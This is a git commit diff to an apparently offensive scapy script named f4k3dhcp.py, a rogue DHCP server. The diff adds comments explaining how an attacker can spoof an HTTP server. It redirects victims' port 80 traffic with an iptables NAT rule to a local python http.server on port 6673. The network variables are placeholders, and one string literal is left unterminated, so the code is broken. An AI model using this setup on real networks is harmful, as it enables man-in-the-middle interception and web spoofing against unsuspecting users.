f6b480eac70d60ba5ac22d8762680e205950c7b9
P4ti3nn3 <115619908+P4ti3nn3@users.noreply.github.com>
2023-12-11 12:06:05 +0100

    Update f4k3dhcp.py

--- Scr1pts/f4k3dhcp.py
+++ Scr1pts/f4k3dhcp.py
@@ -1,6 +1,16 @@
 from scapy.all import DHCP_am
 from scapy.base_classes import Net
 
+#to spoof an http serv :
+#
+#on hacker:
+#
+#iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 6673
+#
+#and 
+#
+#python3 -m http.server 6673
+
 OurNetwork = 'X.X.X.X'
 AttackerNet = 'X.X.X.X4
 
